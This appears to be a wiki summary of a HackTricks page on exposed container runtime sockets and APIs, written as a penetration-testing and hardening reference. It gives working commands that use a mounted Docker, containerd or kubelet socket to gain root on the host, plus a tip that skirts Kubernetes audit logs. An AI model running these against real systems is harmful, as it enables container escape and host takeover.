---
title: "HackTricks — Runtime API and Daemon Exposure"
tags:
  [
    container-security,
    docker,
    containerd,
    podman,
    privilege-escalation,
    hacktricks,
  ]
sources: [hacktricks-runtime-api-daemon-exposure.md]
updated: 2026-05-01
---

# HackTricks — Runtime API and Daemon Exposure

Source: [HackTricks](../entities/hacktricks.md)

## Key Takeaways

Many real container compromises start not with a kernel escape but with access to the **runtime control plane**. A container that can talk to `dockerd`, `containerd`, CRI-O, Podman, or kubelet through a mounted socket is often one API call away from host compromise — regardless of whether seccomp, capabilities, and AppArmor are working correctly.

## Attack Surface

### Common socket paths to check

```
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Remote exposure: Docker historically exposed `tcp://0.0.0.0:2375` (no TLS) or `2376` (TLS). Listening on plain HTTP is effectively remote root.

### Discovery

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \
  -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|BUILDKIT_HOST|XDG_RUNTIME_DIR'
```

### No CLI? Use curl

Docker Engine speaks HTTP over its Unix socket:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create
```

## Exploitation Examples

### Docker socket → host root

```bash
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

### Docker socket → host namespaces

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### containerd socket

```bash
ctr --address /run/containerd/containerd.sock run --tty --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

### BuildKit socket

BuildKit is often overlooked as "just the build backend" but is a privileged control plane. Dangerous entitlements when enabled: `network.host`, `security.insecure`.

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
```

### Kubelet API (port 10250)

```bash
curl -sk https://127.0.0.1:10250/pods
# nodes/proxy + exec via WebSocket = code execution in other containers
```

`nodes/proxy` with only `get` permission can still reach kubelet exec endpoints — these requests bypass normal K8s audit logs.

## Runtime Defaults Table

| Runtime       | Default state                               | Key risks                                         |
| ------------- | ------------------------------------------- | ------------------------------------------------- |
| Docker Engine | Local Unix socket, rootful                  | Mounting socket, plain-TCP `2375`, weak TLS       |
| Podman        | Daemonless by default                       | `podman system service` socket exposure           |
| containerd    | Local privileged socket                     | Mounting socket, broad `ctr`/`nerdctl` access     |
| CRI-O         | Local privileged socket                     | Mounting `crio.sock` to untrusted workloads       |
| Kubelet       | Node-local, should be unreachable from Pods | Weak auth, host networking, mounted kubelet certs |

## Related Pages

- [Container Security](../concepts/container-security.md)
- [HackTricks — Container Runtimes and Engines](hacktricks-container-runtimes.md)
- [HackTricks — Sensitive Host Mounts](hacktricks-sensitive-host-mounts.md)
- [HackTricks](../entities/hacktricks.md)
